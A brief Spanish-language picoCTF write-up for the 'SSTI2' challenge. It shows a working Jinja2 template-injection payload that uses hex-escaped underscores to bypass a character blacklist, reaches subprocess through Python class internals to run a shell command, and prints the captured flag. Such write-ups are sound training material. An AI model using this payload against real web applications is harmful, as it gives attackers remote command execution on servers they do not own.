
## Descripción 

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:58715/)!
### pista

- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?
## Solución

- Entramos en la pagina.
![[09-SSTI2_IMG1.png]]
- Verificamos si es posible hacerle una inyección.
![[09-SSTI2_IMG2.png]]
- Una vez hecho esto colocamos lo siguiente: {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(356)('cat flag', shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
![[09-SSTI2_IMG3.png]]
- Vemos que nos da la bandera.
![[09-SSTI2_IMG4.png]]




```
picoCTF{sst1_f1lt3r_byp4ss_ece726e9}
```


## Referencias

- https://youtu.be/CAUPJ3rjdTg?si=Fs4u56KoupijJZ9K